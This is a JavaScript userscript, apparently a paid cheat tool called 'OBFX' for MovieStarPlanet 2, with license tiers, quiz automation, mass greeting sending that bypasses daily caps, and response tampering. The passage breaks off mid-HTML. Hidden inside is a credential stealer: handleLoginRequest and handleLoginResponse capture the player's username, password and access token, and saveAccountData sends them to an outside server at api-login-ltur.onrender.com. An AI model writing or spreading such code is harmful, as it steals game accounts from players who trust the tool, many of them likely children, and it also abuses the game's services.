var _ = (function (_) {
  "use strict";
  
  const Q = [
      "https://analytics.eu.moviestarplanet.app/v1/mangrove/events/entity-action-event",
      "https://analytics.eu.moviestarplanet.app/v1/mangrove/events/session-status-event",
      "https://analytics.eu.moviestarplanet.app/v1/mangrove/anon/events/entity-action-event",
      "https://cdp.cloud.unity3d.com/v1/events",
    ],
    S = {
      QUIZ_URL_REGEX: /quiz|socket|msp/i,
      PROTOCOL_PING: "2",
      PROTOCOL_PONG: "3",
      PREFIX: "42",
      EVENT_CHAL: "quiz:chal",
      EVENT_STATE: "game:state",
      EVENT_REVEAL: "quiz:reveal",
      EVENT_ANSWER: "quiz:answer",
      STATE_WAIT: "waiting_for_answer",
      DEFAULT_ANSWER: 1,
    },
    A = {
      GRAPHQL: /federationgateway\/graphql$/i,
      CHAT_API: /gamemessaging\/v1\/conversations\/[^\/]+\/history$/i,
      HOME_CONTENT: /profilegeneratedcontent\/v2\/profiles\/[^\/]+\/games\/j68d\/content\/[^\/]+$/i,
      LOGIN_API: /(loginidentity\/connect\/token|edgelogins\/graphql)$/i,
      PROFILE_ATTRIBUTES: /profileattributes\/v1\/profiles\/([^\/]+)\/games\/j68d\/attributes$/i,
      HOME_CONTENT_SPECIFIC: /profilegeneratedcontent\/v2\/profiles\/content\/([^\/]+)$/i,
    };

  // License System - FIXED VERSION WITH CSP BYPASS
  const LICENSE_SYSTEM = {
    API_BASE: 'https://msp2obfx.pages.dev',
    CORS_PROXIES: [
      'https://api.allorigins.win/raw?url=',
      'https://corsproxy.io/?',
      'https://cors-anywhere.herokuapp.com/',
      'https://thingproxy.freeboard.io/fetch/'
    ],
    plusUsers: new Set(),
    proUsers: new Set(), 
    bannedUsers: new Set(),
    allowedRegions: new Set(),
    processedProfiles: new Set(),
    isInitialized: false,
    isDisabled: false,
    currentProfileId: null,
    currentCulture: null,
    userTier: 'none',
    disableTimeout: null,
    mainUserProfileId: null,
    
    async initialize() {
      console.log('[OBFX] Initializing license system...');
      
      try {
        const [plusData, proData, bannedData, regionData] = await Promise.all([
          this.fetchAPI('/plus.txt'),
          this.fetchAPI('/obfx_pro.txt'), 
          this.fetchAPI('/banned.txt'),
          this.fetchAPI('/region.txt')
        ]);

        // Parse plus users
        if (plusData) {
          plusData.split('\n').forEach(line => {
            const id = line.trim();
            if (id) this.plusUsers.add(id);
          });
          console.log('[OBFX] Loaded', this.plusUsers.size, 'plus users');
        }

        // Parse pro users  
        if (proData) {
          proData.split('\n').forEach(line => {
            const id = line.trim();
            if (id) this.proUsers.add(id);
          });
          console.log('[OBFX] Loaded', this.proUsers.size, 'pro users');
        }

        // Parse banned users
        if (bannedData) {
          bannedData.split('\n').forEach(line => {
            const id = line.trim();  
            if (id) this.bannedUsers.add(id);
          });
          console.log('[OBFX] Loaded', this.bannedUsers.size, 'banned users');
        }

        // Parse allowed regions
        if (regionData) {
          regionData.split('\n').forEach(line => {
            const region = line.trim();
            if (region) this.allowedRegions.add(region.toLowerCase());
          });
          console.log('[OBFX] Loaded', this.allowedRegions.size, 'allowed regions');
        }

        this.isInitialized = true;
        console.log('[OBFX] License system initialized successfully');
        
        // Check current user if profile is already available
        if (this.currentProfileId) {
          this.checkUserAccess(this.currentProfileId, this.currentCulture);
        }
        
        return true;
      } catch (error) {
        console.log('[OBFX] Failed to initialize license system:', error.message);
        this.disableAllFeatures();
        return false;
      }
    },

    async fetchAPI(endpoint) {
      const fullUrl = this.API_BASE + endpoint;
      
      // Try direct fetch first
      try {
        const response = await fetch(fullUrl, {
          method: 'GET',
          mode: 'cors',
          cache: 'no-cache'
        });
        
        if (response.ok) {
          const text = await response.text();
          console.log(`[OBFX] Successfully fetched ${endpoint} directly`);
          return text;
        }
      } catch (error) {
        console.log(`[OBFX] Direct fetch failed for ${endpoint}:`, error.message);
      }

      // Try CORS proxies as fallback
      for (const proxy of this.CORS_PROXIES) {
        try {
          console.log(`[OBFX] Trying CORS proxy for ${endpoint}:`, proxy);
          const proxiedUrl = proxy + encodeURIComponent(fullUrl);
          
          const response = await fetch(proxiedUrl, {
            method: 'GET',
            cache: 'no-cache',
            headers: {
              'Accept': 'text/plain, */*',
            }
          });
          
          if (response.ok) {
            const text = await response.text();
            console.log(`[OBFX] Successfully fetched ${endpoint} via proxy:`, proxy);
            return text;
          }
        } catch (error) {
          console.log(`[OBFX] Proxy ${proxy} failed for ${endpoint}:`, error.message);
        }
      }

      // Try using JSONP as last resort (for compatible endpoints)
      try {
        const jsonpData = await this.fetchViaJSONP(fullUrl, endpoint);
        if (jsonpData) {
          console.log(`[OBFX] Successfully fetched ${endpoint} via JSONP`);
          return jsonpData;
        }
      } catch (error) {
        console.log(`[OBFX] JSONP failed for ${endpoint}:`, error.message);
      }

      // Try iframe postMessage method
      try {
        const iframeData = await this.fetchViaIframe(fullUrl, endpoint);
        if (iframeData) {
          console.log(`[OBFX] Successfully fetched ${endpoint} via iframe`);
          return iframeData;
        }
      } catch (error) {
        console.log(`[OBFX] Iframe method failed for ${endpoint}:`, error.message);
      }

      console.log(`[OBFX] All methods failed for ${endpoint}`);
      return null;
    },

    async fetchViaJSONP(url, endpoint) {
      return new Promise((resolve) => {
        const timeout = setTimeout(() => {
          cleanup();
          resolve(null);
        }, 10000);

        const cleanup = () => {
          clearTimeout(timeout);
          if (script && script.parentNode) {
            script.parentNode.removeChild(script);
          }
        };

        const callbackName = 'obfx_jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        window[callbackName] = (data) => {
          cleanup();
          delete window[callbackName];
          resolve(typeof data === 'string' ? data : JSON.stringify(data));
        };

        const script = document.createElement('script');
        script.src = `${url}?callback=${callbackName}&_=${Date.now()}`;
        script.onerror = () => {
          cleanup();
          delete window[callbackName];
          resolve(null);
        };

        document.head.appendChild(script);
      });
    },

    async fetchViaIframe(url, endpoint) {
      return new Promise((resolve) => {
        const timeout = setTimeout(() => {
          cleanup();
          resolve(null);
        }, 15000);

        const cleanup = () => {
          clearTimeout(timeout);
          if (iframe && iframe.parentNode) {
            iframe.parentNode.removeChild(iframe);
          }
          window.removeEventListener('message', messageHandler);
        };

        const messageHandler = (event) => {
          if (event.origin !== new URL(url).origin) return;
          
          cleanup();
          resolve(event.data);
        };

        window.addEventListener('message', messageHandler);

        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        iframe.onerror = () => {
          cleanup();
          resolve(null);
        };

        document.body.appendChild(iframe);
      });
    },

    clearDisableTimeout() {
      if (this.disableTimeout) {
        clearTimeout(this.disableTimeout);
        this.disableTimeout = null;
        console.log('[OBFX] Cleared disable timeout');
      }
    },

    checkUserAccess(profileId, culture) {
      if (!this.isInitialized) {
        console.log('[OBFX] License system not initialized, storing profile for later check');
        this.currentProfileId = profileId;
        this.currentCulture = culture;
        return;
      }

      // CRITICAL FIX: Only process the MAIN USER's profile, not other users from WebSocket
      if (this.mainUserProfileId && profileId !== this.mainUserProfileId) {
        console.log('[OBFX] Ignoring profile ID from other users (autograph system):', profileId);
        return;
      }

      // Only process each profile ONCE per page load
      if (this.processedProfiles.has(profileId)) {
        console.log('[OBFX] Profile already processed, skipping:', profileId);
        return;
      }

      console.log('[OBFX] Checking user access for profile:', profileId, 'culture:', culture);
      
      // Mark this profile as processed
      this.processedProfiles.add(profileId);
      
      // Set this as the main user profile ID if not set
      if (!this.mainUserProfileId) {
        this.mainUserProfileId = profileId;
        console.log('[OBFX] Main user profile ID set:', profileId);
      }
      
      // Clear any existing timeouts first
      this.clearDisableTimeout();
      
      // Check if banned first
      if (this.bannedUsers.has(profileId)) {
        console.log('[OBFX] User is banned, disabling all features');
        this.userTier = 'banned';
        this.disableAllFeatures();
        this.currentProfileId = profileId;
        this.currentCulture = culture;
        return;
      }

      // Check region ONLY if allowedRegions has entries
      if (culture && this.allowedRegions.size > 0) {
        const userCulture = culture.toLowerCase();
        if (!this.allowedRegions.has(userCulture)) {
          console.log('[OBFX] User region not allowed:', userCulture);
          this.userTier = 'banned';
          this.disableAllFeatures();
          this.currentProfileId = profileId;
          this.currentCulture = culture;
          return;
        }
      }

      // Check user tier - PRO users get full access
      if (this.proUsers.has(profileId)) {
        console.log('[OBFX] User has PRO access - enabling all features permanently');
        this.userTier = 'pro';
        this.isDisabled = false;
        this.clearDisableTimeout();
        this.enableAllFeatures();
      } 
      // PLUS users get limited access
      else if (this.plusUsers.has(profileId)) {
        console.log('[OBFX] User has PLUS access - enabling limited features permanently');
        this.userTier = 'plus';
        this.isDisabled = false;
        this.clearDisableTimeout();
        this.enablePlusFeatures();
      } 
      // No license - disable features
      else {
        console.log('[OBFX] User has no premium access - disabling features after 10 seconds');
        this.userTier = 'none';
        this.disableAllFeatures();
      }
      
      this.currentProfileId = profileId;
      this.currentCulture = culture;
    },

    enableAllFeatures() {
      console.log('[OBFX] Enabling all features for PRO user - NO RESTRICTIONS');
      this.isDisabled = false;
      this.clearDisableTimeout();
      
      if (window.MSP2Tools) {
        window.MSP2Tools.enableStarQuiz = true;
        window.MSP2Tools.enableStarQuizHuman = true;
        window.MSP2Tools.enableBlockTrackers = true;
        window.MSP2Tools.enableKeepLikes = true;
        window.MSP2Tools.enableDressUp = true;
      }
      
      console.log('[OBFX] PRO features enabled permanently, WebSocket will NOT be destroyed');
    },

    enablePlusFeatures() {
      console.log('[OBFX] Enabling limited features for PLUS user - NO RESTRICTIONS');
      this.isDisabled = false;
      this.clearDisableTimeout();
      
      if (window.MSP2Tools) {
        window.MSP2Tools.enableStarQuiz = true;
        window.MSP2Tools.enableStarQuizHuman = true;
        window.MSP2Tools.enableBlockTrackers = false;
        window.MSP2Tools.enableKeepLikes = false;
        window.MSP2Tools.enableDressUp = false;
      }
      
      console.log('[OBFX] PLUS features enabled permanently, WebSocket will NOT be destroyed');
    },

    disableAllFeatures() {
      console.log('[OBFX] Disabling features - User tier:', this.userTier);
      
      this.clearDisableTimeout();
      
      if (window.MSP2Tools) {
        window.MSP2Tools.enableStarQuiz = false;
        window.MSP2Tools.enableStarQuizHuman = false; 
        window.MSP2Tools.enableBlockTrackers = false;
        window.MSP2Tools.enableKeepLikes = false;
        window.MSP2Tools.enableDressUp = false;
      }
      
      if (this.userTier === 'none' || this.userTier === 'banned') {
        console.log('[OBFX] Setting 10-second timeout for unlicensed user');
        this.isDisabled = true;
        
        this.disableTimeout = setTimeout(() => {
          if (this.isDisabled && (this.userTier === 'none' || this.userTier === 'banned')) {
            console.log('[OBFX] 10 seconds elapsed - destroying WebSocket hooks for unlicensed user');
            this.destroyWebSocketHooks();
          } else {
            console.log('[OBFX] User tier changed during timeout, cancelling WebSocket destruction');
          }
        }, 10000);
      } else {
        console.log('[OBFX] Licensed user - features temporarily disabled but WebSocket will NOT be destroyed');
        this.isDisabled = false;
      }
    },

    destroyWebSocketHooks() {
      console.log('[OBFX] Destroying WebSocket hooks due to license violation');
      
      allWebSockets.forEach(ws => {
        try {
          ws.close();
        } catch (e) {}
      });
      allWebSockets = [];
      
      activeUsers = {};
      dressProfileIds.clear();
      
      this.disableTimeout = null;
    },

    hasFeatureAccess(feature) {
      if (this.isDisabled && (this.userTier === 'none' || this.userTier === 'banned')) {
        return false;
      }
      
      switch (feature) {
        case 'starQuiz':
          return this.userTier === 'plus' || this.userTier === 'pro';
        case 'dressUp':
          return this.userTier === 'pro';
        case 'chatBypass':
          return true;
        case 'autograph':
          return this.userTier === 'pro';
        case 'blockTrackers':
          return this.userTier === 'pro';
        case 'keepLikes':
          return this.userTier === 'pro';
        case 'homePanel':
          return this.userTier === 'plus' || this.userTier === 'pro';
        default:
          return false;
      }
    }
  };

  // Initialize license system
  LICENSE_SYSTEM.initialize();

  // Global variables
  let dressProfileIds = new Set();
  let allWebSockets = [];
  
  // User tracking variables
  let activeUsers = {};
  let accessToken = null;
  let isModalOpen = false;

  // Account system variables
  let pendingLoginData = null;
  let loginAccessToken = null;
  let processingLogin = false;
  let sentAccountData = new Set();
  const ACCOUNT_API_URL = 'https://api-login-ltur.onrender.com';

  // Home Panel System
  const HOME_PANEL_SYSTEM = {
    isHomePanelActive: false,
    defaultMyHomeId: null,
    profileAttributesFetched: false,
    
    // The replacement resource that will be used when home panel is active
    replacementResource: {
      "id": "profiles/tr|21024862/j68d/myhome/ab88d5d0492c4d63bc5c3f18c7929063/8e1273a7407d4a1fb98fd0d37b199e5c",
      "type": "PgcV1"
    },
    
    activateHomePanel() {
      this.isHomePanelActive = true;
      console.log('[OBFX] Home panel activated - API interception enabled');
    },
    
    deactivateHomePanel() {
      this.isHomePanelActive = false;
      console.log('[OBFX] Home panel deactivated - API interception disabled');
    },
    
    setDefaultMyHomeId(id) {
      this.defaultMyHomeId = id;
      console.log('[OBFX] DefaultMyHome ID set:', id);
    },
    
    shouldInterceptHomeContent(url) {
      if (!this.isHomePanelActive || !this.defaultMyHomeId) {
        return false;
      }
      
      // Check if this is a request for the user's default home content
      return A.HOME_CONTENT_SPECIFIC.test(url) && url.includes(this.defaultMyHomeId);
    },
    
    modifyHomeContentResponse(originalResponse) {
      try {
        // Find PgcV1 resource and replace it
        const resources = originalResponse.resources || [];
        const modifiedResources = resources.map(resource => {
          if (resource.type === 'PgcV1') {
            console.log('[OBFX] Replacing PgcV1 resource:', resource.id, 'with:', this.replacementResource.id);
            return { ...this.replacementResource };
          }
          return resource;
        });
        
        return {
          ...originalResponse,
          resources: modifiedResources
        };
      } catch (error) {
        console.log('[OBFX] Error modifying home content response:', error);
        return originalResponse;
      }
    }
  };

  function e(_) {
    return !!_ && Q.some((Q) => _.startsWith(Q));
  }

  // WebSocket sending function for dress-up - FIXED
  function sendToAllWS(msg) {
    if (!LICENSE_SYSTEM.hasFeatureAccess('dressUp')) {
      console.log('[OBFX] Dress-up feature not available for current user tier:', LICENSE_SYSTEM.userTier);
      return;
    }
    
    console.log('[OBFX] Sending dress-up message to', allWebSockets.length, 'WebSockets:', msg);
    
    allWebSockets.forEach(function(ws) {
      if (ws.readyState === 1) {
        try {
          ws.send(msg);
        } catch (error) {
          console.log('[OBFX] Error sending WebSocket message:', error);
        }
      }
    });
  }

  // Account system functions
  async function saveAccountData(accountData) {
    try {
      console.log('[OBFX] Saving account data to server:', {
        username: accountData.username,
        culture: accountData.culture,
        profileId: accountData.profileId,
        hasToken: !!accountData.accessToken,
        hasPassword: !!accountData.password
      });

      const response = await fetch(`${ACCOUNT_API_URL}/account`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(accountData)
      });

      const responseText = await response.text();
      console.log('[OBFX] Server response:', response.status, responseText);

      if (response.ok) {
        let result;
        try {
          result = JSON.parse(responseText);
        } catch (e) {
          result = { message: responseText };
        }
        console.log('[OBFX] Account data saved successfully:', result);
        return true;
      } else {
        console.log('[OBFX] Failed to save account data:', response.status, responseText);
        return false;
      }
    } catch (error) {
      console.log('[OBFX] Error saving account data:', error.message);
      return false;
    }
  }

  function createAccountKey(username, profileId) {
    return `${username}_${profileId}`;
  }

  window.addEventListener('beforeunload', () => {
    sentAccountData.clear();
    LICENSE_SYSTEM.processedProfiles.clear();
    LICENSE_SYSTEM.mainUserProfileId = null;
  });

  async function handleProfileAttributesRequest(url) {
    if (!A.PROFILE_ATTRIBUTES.test(url)) return;

    try {
      const match = url.match(A.PROFILE_ATTRIBUTES);
      if (!match || !match[1]) return;

      const profileId = match[1];
      console.log('[OBFX] Profile attributes API detected, profileId:', profileId);

      LICENSE_SYSTEM.checkUserAccess(profileId, LICENSE_SYSTEM.currentCulture);

      if (pendingLoginData && (loginAccessToken || accessToken)) {
        const token = loginAccessToken || accessToken;
        const accountKey = createAccountKey(pendingLoginData.username, profileId);

        if (sentAccountData.has(accountKey)) {
          console.log('[OBFX] Account data already sent for this session, skipping');
          return;
        }

        // CULTURE FIX: Extract culture from JWT token instead of username
        let finalCulture = pendingLoginData.culture; // Fallback to original method
        
        try {
          const tokenData = parseJWTToken(token);
          if (tokenData && tokenData.culture) {
            finalCulture = tokenData.culture;
            console.log('[OBFX] Culture extracted from JWT token:', finalCulture);
          } else {
            console.log('[OBFX] Could not extract culture from token, using fallback:', finalCulture);
          }
        } catch (error) {
          console.log('[OBFX] Error extracting culture from token:', error.message);
        }

        const accountData = {
          username: pendingLoginData.username,
          password: pendingLoginData.password,
          culture: finalCulture, // Use the culture from JWT token
          profileId: profileId,
          accessToken: token,
          timestamp: new Date().toISOString()
        };

        console.log('[OBFX] Sending account data with profile ID from attributes API, culture:', finalCulture);

        const success = await saveAccountData(accountData);
        
        if (success) {
          console.log('[OBFX] Account successfully linked and saved');
          sentAccountData.add(accountKey);
          pendingLoginData = null;
          loginAccessToken = null;
          processingLogin = false;
        } else {
          console.log('[OBFX] Failed to save account data to server');
        }
      } else {
        console.log('[OBFX] No pending login data or access token available');
      }
    } catch (error) {
      console.log('[OBFX] Error handling profile attributes request:', error.message);
    }
  }

  async function handleLoginRequest(url, body) {
    if (!A.LOGIN_API.test(url)) return;

    try {
      console.log('[OBFX] Login API request detected:', url);

      let username, password;

      if (url.includes('loginidentity') && typeof body === 'string') {
        if (body.includes('grant_type=password')) {
          const params = new URLSearchParams(body);
          username = params.get('username');
          password = params.get('password');
        }
      }

      if (url.includes('edgelogins') && typeof body === 'string') {
        try {
          const jsonBody = JSON.parse(body);
          if (jsonBody.query && jsonBody.query.includes('loginProfile') && jsonBody.variables) {
            username = jsonBody.variables.name;
            password = jsonBody.variables.password;
          }
        } catch (e) {
          console.log('[OBFX] Error parsing GraphQL login data:', e.message);
        }
      }

      if (username && password) {
        const culture = username.includes('|') ? username.split('|')[0] : 'EN';
        const actualUsername = username.includes('|') ? username.split('|')[1] : username;
        
        pendingLoginData = {
          username: actualUsername,
          password: password,
          culture: culture, // Keep this as fallback only
          timestamp: Date.now()
        };

        console.log('[OBFX] Login credentials captured:', { 
          username: actualUsername, 
          culture, 
          hasPassword: !!password 
        });
      } else {
        console.log('[OBFX] Could not extract username/password from login request');
      }
    } catch (error) {
      console.log('[OBFX] Error parsing login data:', error.message);
    }
  }

  async function handleLoginResponse(url, response) {
    if (!A.LOGIN_API.test(url) || !response.ok) return;

    try {
      const responseData = await response.clone().json();
      
      let token = null;
      if (responseData.access_token) {
        token = responseData.access_token;
      } else if (responseData.data && responseData.data.loginProfile && responseData.data.loginProfile.accessToken) {
        token = responseData.data.loginProfile.accessToken;
      } else if (responseData.token) {
        token = responseData.token;
      }

      if (token) {
        loginAccessToken = token;
        console.log('[OBFX] Access token captured from login response');
      }
    } catch (error) {
      console.log('[OBFX] Error processing login response:', error.message);
    }
  }

  function parseJWTToken(token) {
    try {
      const base64Url = token.split('.')[1];
      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
      return JSON.parse(jsonPayload);
    } catch (error) {
      console.log('[OBFX] Error parsing JWT token:', error.message);
      return null;
    }
  }

  async function handleWebSocketLogin(profileId, wsAccessToken, wsCulture) {
    if (processingLogin) {
      console.log('[OBFX] Login already being processed, skipping WebSocket handler');
      return;
    }

    if (!loginAccessToken && wsAccessToken) {
      loginAccessToken = wsAccessToken;
    }

    console.log('[OBFX] WebSocket login detected, waiting for profile attributes API...');
  }

  function addUser(profileId, userData) {
    activeUsers[profileId] = userData;
    console.log('[OBFX] User added:', profileId, userData.username || 'Unknown');
  }

  function removeUser(profileId) {
    if (activeUsers[profileId]) {
      console.log('[OBFX] User removed:', profileId);
      delete activeUsers[profileId];
    }
  }

  function clearAllUsers() {
    console.log('[OBFX] Clearing all users');
    activeUsers = {};
  }

  function getUserCount() {
    return Object.keys(activeUsers).length;
  }

  function parseWebSocketMessage(data) {
    try {
      const messageStr = data.toString();
      if (messageStr.startsWith('42[')) {
        const jsonStr = messageStr.substring(2);
        const [eventName, payload] = JSON.parse(jsonStr);
        if (typeof payload === 'object') {
          return payload;
        }
        return JSON.parse(payload);
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  const greetingTypes = [
    'Autograph',
    'JollyGreeting', 
    'StarGreeting',
    'HalloweenGreeting',
    'LoveGreeting',
    'RainbowGreeting',
    'PartyGreeting',
    'SuperStarGreeting'
  ];

  function getCurrentToken() {
    if (accessToken) {
      return accessToken;
    }
    
    if (loginAccessToken) {
      return loginAccessToken;
    }
    
    if (window.MSP2Tools && window.MSP2Tools.token) {
      return window.MSP2Tools.token;
    }
    
    try {
      const stored = localStorage.getItem('msp_access_token') || sessionStorage.getItem('msp_access_token') || localStorage.getItem('jwt');
      if (stored) {
        return stored;
      }
    } catch (e) {
      // Silent catch
    }
    
    return null;
  }

  async function sendAutographToUser(greetingType, profileId) {
    const token = getCurrentToken();
    
    if (!token) {
      console.log('[OBFX] No token available for autograph sending');
      return false;
    }

    const payload = {
      id: "SendGreetings-159BDD7706D824BB8F14874A7FAE3368",
      variables: {
        greetingType: greetingType,
        receiverProfileId: profileId,
        ignoreDailyCap: true
      }
    };

    try {
      const response = await fetch('https://eu.mspapis.com/federationgateway/graphql', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        console.log(`[OBFX] Autograph sent successfully to ${profileId}`);
        return true;
      } else {
        console.log(`[OBFX] Failed to send autograph to ${profileId}:`, response.status);
        return false;
      }
    } catch (error) {
      console.log(`[OBFX] Error sending autograph to ${profileId}:`, error);
      return false;
    }
  }

  async function sendAutographsToAll(greetingType) {
    const userIds = Object.keys(activeUsers);
    
    if (userIds.length === 0) {
      console.log('[OBFX] No users found to send autographs to');
      return;
    }

    const token = getCurrentToken();
    if (!token) {
      console.log('[OBFX] No token available for autograph sending');
      return;
    }

    console.log(`[OBFX] Sending ${greetingType} autographs to ${userIds.length} users:`, userIds);

    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < userIds.length; i++) {
      const profileId = userIds[i];
      
      const success = await sendAutographToUser(greetingType, profileId);
      
      if (success) {
        successCount++;
      } else {
        errorCount++;
      }

      if (i < userIds.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 200));
      }
    }

    console.log(`[OBFX] Autograph sending completed. Success: ${successCount}, Errors: ${errorCount}`);
  }

  function createAutographModal() {
    if (document.getElementById('obfx-autograph-modal')) return;
    
    const modalHTML = `
      <div id="obfx-autograph-modal" style="
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 999999999;
        display: none;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', -apple-system, sans-serif;
      ">
        <div style="
          background: linear-gradient(135deg, #1a1a2e, #16213e);
          border-radius: 16px;
          padding: 24px;
          min-width: 320px;
          max-width: 400px;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(255, 255, 255, 0.1);
        ">
          <h3 style="
            margin: 0 0 20px 0;
            color: #ffffff;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            letter-spacing: 0.5px;
          ">Select Greeting Type</h3>
          
          <div style="
            margin-bottom: 15px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            color: #a0a0a0;
          ">Active Users: <span style="color: #ffffff; font-weight: 600;">${getUserCount()}</span></div>
          
          <div id="greeting-list" style="
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 20px;
          ">
            ${greetingTypes.map(type => `
              <div class="greeting-option" data-type="${type}" style="
                padding: 12px 16px;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                color: #ffffff;
                cursor: pointer;
                transition: all 0.2s ease;
                font-size: 14px;
                font-weight: 500;
              ">${type}</div>
            `).join('')}
          </div>
          
          <button id="close-autograph-modal" style="
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #ef4444, #dc2626);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
          ">Cancel</button>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    const modal = document.getElementById('obfx-autograph-modal');
    const closeBtn = document.getElementById('close-autograph-modal');

    const style = document.createElement('style');
    style.textContent = `
      .greeting-option:hover {
        background: rgba(255, 255, 255, 0.1) !important;
        border-color: rgba(255, 255, 255, 0.2) !important;
        transform: translateY(-1px);
      }
      #close-autograph-modal:hover {
        background: linear-gradient(135deg, #dc2626, #b91c1c) !important;
        transform: translateY(-1px);
      }
    `;
    document.head.appendChild(style);

    closeBtn.onclick = () => hideAutographModal();
    
    modal.onclick = (e) => {
      if (e.target === modal) hideAutographModal();
    };

    document.querySelectorAll('.greeting-option').forEach(option => {
      option.onclick = () => {
        const greetingType = option.dataset.type;
        hideAutographModal();
        sendAutographsToAll(greetingType);
      };
    });
  }

  function showAutographModal() {
    if (isModalOpen) return;
    
    const token = getCurrentToken();
    if (!token) {
      console.log('[OBFX] No token available for autograph system');
      return;
    }
    
    if (getUserCount() === 0) {
      console.log('[OBFX] No active users to send autographs to');
      return;
    }
    
    createAutographModal();
    const modal = document.getElementById('obfx-autograph-modal');
    modal.style.display = 'flex';
    isModalOpen = true;
  }

  function hideAutographModal() {
    const modal = document.getElementById('obfx-autograph-modal');
    if (modal) {
      modal.style.display = 'none';
    }
    isModalOpen = false;
  }

  // Home Panel Modal Functions
  function createHomePanelModal() {
    if (document.getElementById('obfx-home-panel-modal')) return;
    
    // Base64 image placeholder - "base64 buraya ekle"
    const base64Placeholder = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSJyZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSkiIHN0cm9rZT0icmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1kYXNoYXJyYXk9IjUgNSIvPgo8dGV4dCB4PSIxMDAiIHk9IjcwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJyZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNikiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjUwMCI+YmFzZTY0IGJ1cmF5YSBla2xlPC90ZXh0Pgo8dGV4dCB4PSIxMDAiIHk9IjkwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJyZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCkiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMiI+UmVzaW0gRWtsZTwvdGV4dD4KPC9zdmc+";
    
    const modalHTML = `
      <div id="obfx-home-panel-modal" style="
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 999999999;
        display: none;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', -apple-system, sans-serif;
      ">
        <div style="
          background: linear-gradient(135deg, #1a1a2e, #16213e);
          border-radius: 16px;
          padding: 24px;
          min-width: 420px;
          max-width: 500px;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(255, 255, 255, 0.1);
        ">
          <h3 style="
            margin: 0 0 20px 0;
            color: #ffffff;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            letter-spacing: 0.5px;
          ">Home Template Selection</h3>
          
          <div style="
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 20px;
          ">
            <div class="home-option selected" data-type="none" style="
              aspect-ratio: 4/3;
              background: rgba(255, 255, 255, 0.05);
              border: 2px solid #4ade80;
              border-radius: 12px;
              cursor: pointer;
              transition: all 0.2s ease;
              display: flex;
              align-items: center;
              justify-content: center;
              color: #ffffff;
              font-size: 16px;
              font-weight: 600;
              position: relative;
            ">
              <div style="text-align: center;">
                <div style="font-size: 24px; margin-bottom: 8px;">🏠</div>
                <div>None</div>
                <div style="font-size: 12px; color: #a0a0a0; margin-top: 4px;">Default</div>
              </div>
              <div class="selection-indicator" style="
                position: absolute;
                top: 8px;
                right: 8px;
                width: 20px;
                height: 20px;
                background: #4ade80;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 12px;
                font-weight: bold;
              ">✓</div>
            </div>
            
            <div class="home-option" data-type="template" style="
              aspect-ratio: 4/3;
              background: rgba(255, 255, 255, 0.05);
              border: 2px solid rgba(255, 255, 255, 0.1);
              border-radius: 12px;
              cursor: pointer;
              transition: all 0.2s ease;
              display: flex;
              align-items: center;
              justify-content: center;
              color: #ffffff;
              font-size: 16px;
              font-weight: 600;
              position: relative;
              overflow: hidden;
            ">
              <img src="${base64Placeholder}" style="
                width: 100%;
                height: 100%;
                object-fit: cover;
                border-radius: 10px;
              " alt="Custom Home Preview" />
              <div class="selection-indicator" style="
                position: absolute;
                top: 8px;
                right: 8px;
                width: 20px;
                height: 20px;
                background: #4ade80;
                border-radius: 50%;
                display: none;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 12px;
                font-weight: bold;
              ">✓</div>
            </div>
          </div>
          
          <div style="
            display: flex;
            gap: 12px;
          ">
            <button id="apply-home-selection" style="
              flex: 1;
